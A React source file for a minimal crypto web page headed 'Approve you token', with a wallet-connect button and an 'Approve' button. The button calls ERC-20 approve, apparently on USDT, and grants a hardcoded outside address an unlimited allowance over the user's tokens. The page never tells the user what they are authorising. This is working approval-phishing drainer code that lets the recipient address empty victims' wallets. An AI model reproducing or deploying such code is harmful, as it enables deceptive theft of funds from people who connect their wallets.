import "./App.css";
import { getImageUrl } from "./utils";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount } from "wagmi";
import { useWriteContract } from "wagmi";
import erc20ABI from "./assets/abi/erc20.json";
import { message } from "antd";

const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const toAddress = "0xe3BAC5233DFfbAee9249Db7Ff913081ED27679aA";
const uint256Max = BigInt(2) ** BigInt(256) - BigInt(1);

function App() {
  const { address } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const approveMaxAmount = async () => {
    try {
      console.log(address, "用户地址");
      console.log(uint256Max, "最大授权数量");

      // 授权公司地址可以从用户钱包转移最大数量的代币
      const approveHash = await writeContractAsync({
        abi: erc20ABI,
        address: tokenAddress,
        functionName: "approve",
        args: [toAddress, uint256Max],
      });

      console.log(approveHash, "approveHash");
      if (approveHash) {
        message.success("Authorization successful!");
      }
    } catch (error) {
      console.log(error, "error");
      message.error("There was a problem during the authorization process, please try again");
    }
  };

  return (
    <div className="w-[100vw] h-[100vh] bg-[#000] flex flex-col pb-[15vh]">
      {/* 顶部导航栏 */}
      <div className="flex flex-row px-3 md:px-3 lg:px-12 w-full justify-between items-center border-b border-gray-700">
        <div className="py-3 items-center pr-3 md:pr-3 lg:pr-12">
          <img className="h-[50.89px]" src={getImageUrl("logo.svg")} alt="icon logo text" />
        </div>
        <div className="flex-row ml-6 hidden lg:flex">
          <ConnectButton />
        </div>
      </div>

      <div className="container mx-auto flex-1 flex flex-col lg:flex-row items-center">
        <div className="flex-1 space-y-4">
          <h1 className="text-[#ffffff] text-[64px] font-semibold">Approve you token</h1>
          {address ? (
            <button
              className="w-[178px] h-[48px] bg-[#5580F9] cursor-pointer text-[18px] rounded-[48px] font-semibold text-white hover:opacity-80"
              onClick={approveMaxAmount}
            >
              Approve
            </button>
          ) : (
            <ConnectButton />
          )}
        </div>
        <div className="flex-[1.4] mr-0 lg:mr-[-256px]">
          <img src={getImageUrl("hero.svg")} className="max-w-[1080px] w-full" alt="hero" />
        </div>
      </div>
    </div>
  );
}

export default App;
